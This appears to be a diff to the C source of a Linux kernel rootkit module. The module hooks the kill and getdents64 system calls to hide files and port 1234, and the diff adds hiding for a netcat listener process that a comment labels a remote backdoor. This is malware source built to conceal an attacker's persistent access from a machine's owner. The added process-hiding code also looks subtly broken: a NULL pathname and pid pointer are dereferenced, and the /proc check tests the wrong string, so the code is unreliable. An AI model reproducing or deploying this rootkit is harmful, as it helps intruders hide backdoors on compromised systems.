@@ -23,6 +23,9 @@
 // for controlling the file hider
 #define HIDE_SIG 16
 
+// for process hiding
+#define HIDE_PROC "nc -l 1234" // for remote backdoor
+
 // for port hiding
 #define HIDE_PORT "04D2" // 1234 for hex
 
@@ -73,6 +76,28 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 
 	actual_result = (*orig_kill)(pid,sig);
 	return actual_result;
+}
+
+// for getting a filename from a fd
+void getPathnameFromFD(unsigned int fd, char *pathname, char *buf)
+{
+	struct files_struct *current_files; 
+	struct fdtable *files_table;
+	struct path file_path;
+
+	current_files = current->files;
+	files_table = files_fdtable(current_files);
+
+	file_path = files_table->fd[fd]->f_path;
+	pathname = d_path(&file_path,buf,256*sizeof(char));
+}
+
+// for checking a process name against HIDE_PROC
+int checkProcName(long pid)
+{
+	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
+		return 1;
+	return 0;
 }
 
 // for hijacking sys_getdents
@@ -146,11 +171,16 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent64 *d;
+	char pbuf[256], *pathname = NULL;
+	long *pid = NULL;
 
 	// run real getdents64 
 	result = (*orig_getdents64)(fd,dirp,count);
 	if (result <= 0)
 		return result;
+
+	// get pathname
+	getPathnameFromFD(fd,pathname,pbuf);
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
@@ -160,15 +190,28 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	if (copy_from_user(kdirp,dirp,result))
 		return -1;
 
-	// check result for files to hide
+	// check dirp for "files" to hide
 	for (bp = 0; bp < result;) {
 		d = (struct linux_dirent64 *) (kdirp + bp);
-		list_for_each_entry(ptr,&hidden_files,list) {
-			if (d->d_ino == ptr->inode) {
+		// process hiding
+		if (!strncmp(pathname,"/proc",5)) {
+			kstrtol(pathname + 6,10,pid);
+			if (checkProcName(*pid)) {
 				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					result - bp - d->d_reclen);
 				result -= d->d_reclen;
 				bp -= d->d_reclen;
+			}
+		}
+		// file hiding
+		else {
+			list_for_each_entry(ptr,&hidden_files,list) {
+				if (d->d_ino == ptr->inode) {
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+						result - bp - d->d_reclen);
+					result -= d->d_reclen;
+					bp -= d->d_reclen;
+				}
 			}
 		}
 		bp += d->d_reclen;
